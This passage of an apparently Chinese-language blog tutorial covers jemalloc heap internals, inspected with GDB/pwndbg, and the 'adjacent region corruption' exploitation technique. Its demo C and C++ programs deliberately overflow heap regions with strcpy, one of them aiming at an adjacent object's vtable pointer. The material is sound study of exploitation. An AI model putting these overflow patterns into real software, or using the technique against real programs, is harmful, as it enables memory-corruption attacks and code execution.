class="line">&gt;&gt; foo[<span class="number">11</span>]-foo[<span class="number">10</span>]=<span class="number">1</span></span><br><span class="line">foo[<span class="number">11</span>]:  size:<span class="number">320</span>	<span class="number">0x91c60000</span></span><br><span class="line">&gt;&gt; foo[<span class="number">12</span>]-foo[<span class="number">11</span>]=<span class="number">5</span></span><br><span class="line">foo[<span class="number">12</span>]:  size:<span class="number">384</span>	<span class="number">0x91c65000</span></span><br><span class="line">&gt;&gt; foo[<span class="number">13</span>]-foo[<span class="number">12</span>]=<span class="number">3</span></span><br><span class="line">foo[<span class="number">13</span>]:  size:<span class="number">448</span>	<span class="number">0x91c68000</span></span><br><span class="line">&gt;&gt; foo[<span class="number">14</span>]-foo[<span class="number">13</span>]=<span class="number">7</span></span><br><span class="line">foo[<span class="number">14</span>]:  size:<span class="number">512</span>	<span class="number">0x91c6f000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>不管重复多少次后5位始终不变，说明 jemalloc 的分配以 100page 为单位</li>
<li>地址的分配似乎没有什么规律，可能是 jemalloc 的保护机制吧</li>
</ul>
<h2 id="Jemalloc-GDB"><a href="#Jemalloc-GDB" class="headerlink" title="Jemalloc GDB"></a>Jemalloc GDB</h2><p>GDB 可以用来打印 jemalloc 里面的符号（各种全局变量和结构体），前提如下：</p>
<ul>
<li>在GCC编译时加上 “-ljemalloc” </li>
<li>用 directory 导入对应版本的 jemalloc 源码文件</li>
</ul>
<p>arena 是 jemalloc 的总的管理块，一个进程中可以有多个 arena，arena 的最大个可以通过静态变量 narenas_total 得知，可以在 GDB 中进行打印：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p narenas_total </span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  repr = <span class="number">8</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可通过静态数组 arenas 获取进程中所有 arena 的指针： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *je_arenas@<span class="number">2</span> <span class="comment">/* 添加@n可以使GDB一次显示n个数据块 */</span></span><br><span class="line">$<span class="number">6</span> = &#123;&#123;</span><br><span class="line">    repr = <span class="number">0x7ffff757e980</span></span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    repr = <span class="number">0x0</span></span><br><span class="line">  &#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p (<span class="keyword">arena_t</span> **)je_arenas</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">arena_t</span> **) <span class="number">0x7ffff7da2a80</span> &lt;je_arenas&gt;</span><br><span class="line">    </span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7da2a80</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7da2a80</span> (je_arenas) —▸ <span class="number">0x7ffff757e980</span> ◂— <span class="number">0x100000001</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7da2a88</span> (je_arenas+<span class="number">8</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">6</span> skipped</span><br></pre></td></tr></table></figure>
<ul>
<li>在结构体 arena_t 中有个类型为 arena_bin_t 的数组 bins（动态分配数组 bins 的大小），数组 bins 的每个条目对应1种大小的 region 和 run </li>
<li>binind 表示 bins 中的偏移，每一个 binind 对应一个固定大小的 region，其对应关系为：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">binind = arena_bin_index(chunk-&gt;arena, run-&gt;bin);</span><br><span class="line">bin_info = &amp;arena_bin_info[binind];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">szind_t</span></span></span><br><span class="line"><span class="function">    <span class="title">arena_bin_index</span><span class="params">(<span class="keyword">arena_t</span> *arena, <span class="keyword">arena_bin_t</span> *bin)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">szind_t</span> binind = (<span class="keyword">szind_t</span>)(bin - arena-&gt;bins);</span><br><span class="line">    assert(binind &lt; NBINS);</span><br><span class="line">    <span class="keyword">return</span> binind;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 GDB 中，我们可以通过静态变量 arena_bin_info 获取对应 bin 的其他信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p je_arena_bin_info</span><br><span class="line">$<span class="number">11</span> = &#123;&#123;</span><br><span class="line">    reg_size = <span class="number">8</span>,</span><br><span class="line">    slab_size = <span class="number">4096</span>,</span><br><span class="line">    nregs = <span class="number">512</span>,</span><br><span class="line">    bitmap_info = &#123;</span><br><span class="line">      nbits = <span class="number">512</span>,</span><br><span class="line">      ngroups = <span class="number">8</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    reg_size = <span class="number">16</span>,</span><br><span class="line">    slab_size = <span class="number">4096</span>,</span><br><span class="line">    nregs = <span class="number">256</span>,</span><br><span class="line">    bitmap_info = &#123;</span><br><span class="line">      nbits = <span class="number">256</span>,</span><br><span class="line">      ngroups = <span class="number">4</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    reg_size = <span class="number">32</span>,</span><br><span class="line">    slab_size = <span class="number">4096</span>,</span><br><span class="line">    nregs = <span class="number">128</span>,</span><br><span class="line">    bitmap_info = &#123;</span><br><span class="line">      nbits = <span class="number">128</span>,</span><br><span class="line">      ngroups = <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    reg_size = <span class="number">48</span>,</span><br><span class="line">    slab_size = <span class="number">12288</span>,</span><br><span class="line">    nregs = <span class="number">256</span>,</span><br><span class="line">    bitmap_info = &#123;</span><br><span class="line">      nbits = <span class="number">256</span>,</span><br><span class="line">      ngroups = <span class="number">4</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    reg_size = <span class="number">12288</span>,</span><br><span class="line">    slab_size = <span class="number">12288</span>,</span><br><span class="line">    nregs = <span class="number">1</span>,</span><br><span class="line">    bitmap_info = &#123;</span><br><span class="line">      nbits = <span class="number">1</span>,</span><br><span class="line">      ngroups = <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    reg_size = <span class="number">14336</span>,</span><br><span class="line">    slab_size = <span class="number">28672</span>,</span><br><span class="line">    nregs = <span class="number">2</span>,</span><br><span class="line">    bitmap_info = &#123;</span><br><span class="line">      nbits = <span class="number">2</span>,</span><br><span class="line">      ngroups = <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>可以通过指定 index 来获取对应 size 范围的 arena_bin_info：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p je_arena_bin_info[<span class="number">2</span>]</span><br><span class="line">$<span class="number">12</span> = &#123;</span><br><span class="line">  reg_size = <span class="number">32</span>,</span><br><span class="line">  slab_size = <span class="number">4096</span>,</span><br><span class="line">  nregs = <span class="number">128</span>,</span><br><span class="line">  bitmap_info = &#123;</span><br><span class="line">    nbits = <span class="number">128</span>,</span><br><span class="line">    ngroups = <span class="number">2</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p je_arena_bin_info[<span class="number">3</span>]</span><br><span class="line">$<span class="number">13</span> = &#123;</span><br><span class="line">  reg_size = <span class="number">48</span>,</span><br><span class="line">  slab_size = <span class="number">12288</span>,</span><br><span class="line">  nregs = <span class="number">256</span>,</span><br><span class="line">  bitmap_info = &#123;</span><br><span class="line">    nbits = <span class="number">256</span>,</span><br><span class="line">    ngroups = <span class="number">4</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在结构体 arena_bin_t 中有个类型为 arena_run_t 的指针 runcur，指向当前可用于分配的 run </li>
<li>runs 是个红黑树，链接当前 arena 中，所有可用的相同大小 region 对应的 run，如果 runcur 已满，就会从 runs 里找可用的 run</li>
<li>stats 是当前 bin 对应的 run 和 region 的状态信息</li>
</ul>
<h2 id="Adjacent-region-corruption（相邻区域冲突）"><a href="#Adjacent-region-corruption（相邻区域冲突）" class="headerlink" title="Adjacent region corruption（相邻区域冲突）"></a>Adjacent region corruption（相邻区域冲突）</h2><p>Adjacent region corruption 的核心思想为：利用了堆管理器将用户空间相邻放置的事实，在 jemalloc 中，相同大小类别的区域被放置在同一个 bin 上，如果它们也被放置在 bin 的同一 run 中，则它们之间没有 inline metadata</p>
<p>现在，让我们假设相同大小类新分配的 region 被放置在同一次 run 中：</p>
<ul>
<li>我可以放置一个 victim object/structure 到某个 object/structure 旁边</li>
<li>我们选择的 object/structure 必须是：在同一个 run 中，相邻的，大小相同的，易受伤害的</li>
<li>唯一的要求是：“受害对象” 和 “易受攻击对象” 的大小必须能够放入它们，并且有相同的 size class，方便我们继续溢出</li>
<li>通常受害区域是可以帮助我们实现任意代码执行的东西，例如函数指针</li>
</ul>
<p><strong>利用案例一：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jemalloc/jemalloc.h&gt;</span></span></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *one, *two, *three;</span><br><span class="line">	<span class="keyword">char</span> padding[<span class="number">30</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] before overflowing\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memset</span>(padding, <span class="number">0x58</span>, <span class="number">30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;padding:\t\t%s\n&quot;</span>,padding);	</span><br><span class="line"></span><br><span class="line">	one = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">memset</span>(one, <span class="number">0x41</span>, <span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] region one:\t\t0x%x: %s\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)one, one);</span><br><span class="line"></span><br><span class="line">	two = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">memset</span>(two, <span class="number">0x42</span>, <span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] region two:\t\t0x%x: %s\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)two, two);</span><br><span class="line"></span><br><span class="line">	three = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">memset</span>(three, <span class="number">0x43</span>, <span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] region three:\t0x%x: %s\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)three, three);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* [3-1] */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] copying padding to region two\n&quot;</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(two, padding);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] after overflowing\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] region one:\t\t0x%x: %s\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)one, one);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] region two:\t\t0x%x: %s\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)two, two);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] region three:\t0x%x: %s\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)three, three);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* [3-2] */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(one);</span><br><span class="line">	<span class="built_in">free</span>(two);</span><br><span class="line">	<span class="built_in">free</span>(three);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] after freeing all regions\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] region one:\t\t0x%x: %s\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)one, one);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] region two:\t\t0x%x: %s\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)two, two);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] region three:\t0x%x: %s\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)three, three);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* [3-3] */</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>申请了三片区域：“one”，“two”，“three”</li>
<li>在区域 “two” 中制造溢出</li>
<li>释放这三片区域</li>
</ul>
<p>执行结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> gcc test.c -o jemalloc -ljemalloc -g -no-pie</span><br><span class="line">➜  <span class="built_in">exp</span> ./jemalloc                                  </span><br><span class="line">[*] before overflowing</span><br><span class="line">[+] padding:		XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">[+] region one:		<span class="number">0x115a7000</span>: AAAAAAAAAAAAAAAA</span><br><span class="line">[+] region two:		<span class="number">0x115a7010</span>: BBBBBBBBBBBBBBBB</span><br><span class="line">[+] region three:	<span class="number">0x115a7020</span>: CCCCCCCCCCCCCCCC</span><br><span class="line">[+] copying padding to region two</span><br><span class="line">[*] after overflowing</span><br><span class="line">[+] region one:		<span class="number">0x115a7000</span>: AAAAAAAAAAAAAAAAXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">[+] region two:		<span class="number">0x115a7010</span>: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">[+] region three:	<span class="number">0x115a7020</span>: XXXXXXXXXXXXXX</span><br><span class="line">[*] after freeing all regions</span><br><span class="line">[+] region one:		<span class="number">0x115a7000</span>: AAAAAAAAAAAAAAAAXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">[+] region two:		<span class="number">0x115a7010</span>: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">[+] region three:	<span class="number">0x115a7020</span>: XXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure>
<ul>
<li>关键点1：“one”，“two”，“three” 的数据地址刚好相差 0x10，说明数据连续</li>
<li>关键点2：“two” 中溢出了30字节的“0x58”后，printf 的 “打印边界” 似乎出问题了</li>
<li>关键点3：释放之后，“one”，“two”，“three” 的数据没有置空（UAF预备）</li>
</ul>
<p>接下来就进行单步调试，分析一下以上这些疑点：</p>
<p>断点在 [3-1] 处：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>wx <span class="number">0x7ffff73a0000</span></span><br><span class="line"><span class="number">0x7ffff73a0000</span>:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0x7ffff73a0010</span>:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0x7ffff73a0020</span>:	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现，“one”，“two”，“three” 的数据真的是连续的</li>
</ul>
<p>断点在 [3-2] 处：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>wx <span class="number">0x7ffff73a0000</span></span><br><span class="line"><span class="number">0x7ffff73a0000</span>:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0x7ffff73a0010</span>:	<span class="number">0x58585858</span>	<span class="number">0x58585858</span>	<span class="number">0x58585858</span>	<span class="number">0x58585858</span></span><br><span class="line"><span class="number">0x7ffff73a0020</span>:	<span class="number">0x58585858</span>	<span class="number">0x58585858</span>	<span class="number">0x58585858</span>	<span class="number">0x43005858</span></span><br></pre></td></tr></table></figure>
<ul>
<li>padding 的30个“0x58”完全覆盖了 “two”，并且在 “three” 上持续了15字节（包括最后的“\x00”）</li>
<li>这似乎扰乱了 printf 的打印（不知道是 printf 本身的性质，还是 Regions 的问题），从结果来看，一旦溢出现象发生后，printf 就会分不清楚 Regions 之间的界限，然后用“\x00”来区分 Regions 的范围</li>
<li>利用这个特性，可以溢出一些重要数据</li>
</ul>
<p>断点在 [3-3] 处：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>wx <span class="number">0x7ffff73a0000</span></span><br><span class="line"><span class="number">0x7ffff73a0000</span>:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0x7ffff73a0010</span>:	<span class="number">0x58585858</span>	<span class="number">0x58585858</span>	<span class="number">0x58585858</span>	<span class="number">0x58585858</span></span><br><span class="line"><span class="number">0x7ffff73a0020</span>:	<span class="number">0x58585858</span>	<span class="number">0x58585858</span>	<span class="number">0x58585858</span>	<span class="number">0x43005858</span></span><br></pre></td></tr></table></figure>
<ul>
<li>free 执行完成后，heap 上的数据没有收到任何的影响</li>
</ul>
<p><strong>利用案例二：</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jemalloc/jemalloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">base</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">copy</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">strcpy</span>(buf, str);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;buf: 0x%lx: %s\n&quot;</span>, (<span class="keyword">char</span>*)buf, buf);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">derived_a</span> :</span> <span class="keyword">public</span> base</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] derived_a: &quot;</span>);</span><br><span class="line">            base::<span class="built_in">print</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">derived_b</span> :</span> <span class="keyword">public</span> base</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] derived_b: &quot;</span>);</span><br><span class="line">            base::<span class="built_in">print</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">uintptr_t</span>  argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    base *obj_a;</span><br><span class="line">    base *obj_b;</span><br><span class="line">    <span class="keyword">char</span> padding1[<span class="number">49</span>];</span><br><span class="line">    <span class="keyword">char</span> padding2[<span class="number">11</span>];</span><br><span class="line"></span><br><span class="line">    obj_a = <span class="keyword">new</span> derived_a;</span><br><span class="line">    obj_b = <span class="keyword">new</span> derived_b;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(padding1, <span class="number">0x41</span>, <span class="number">48</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;padding1:\t%s\n&quot;</span>,padding1);	</span><br><span class="line">    <span class="built_in">memset</span>(padding2, <span class="number">0x42</span>, <span class="number">10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;padding2:\t%s\n&quot;</span>,padding2);	</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] obj_a:\t0x%lx\n&quot;</span>, (<span class="keyword">uintptr_t</span> )obj_a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] obj_b:\t0x%lx\n&quot;</span>, (<span class="keyword">uintptr_t</span> )obj_b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] overflowing from obj_a into obj_b\n&quot;</span>);</span><br><span class="line">    obj_a-&gt;<span class="built_in">copy</span>(padding1);</span><br><span class="line">    obj_b-&gt;<span class="built_in">copy</span>(padding2);</span><br><span class="line"></span><br><span class="line">    obj_a-&gt;<span class="built_in">print</span>();</span><br><span class="line">    obj_b-&gt;<span class="built_in">print</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>定义了 base 类：<ul>
<li>函数 copy：用于在 buf 中制造溢出</li>
<li>虚函数 print：用于打印 buf</li>
</ul>
</li>
<li>定义了 derived_a，derived_b 类继承 base 类：<ul>
<li>重写虚函数 print </li>
</ul>
</li>
</ul>
<p>执行结果：</p>
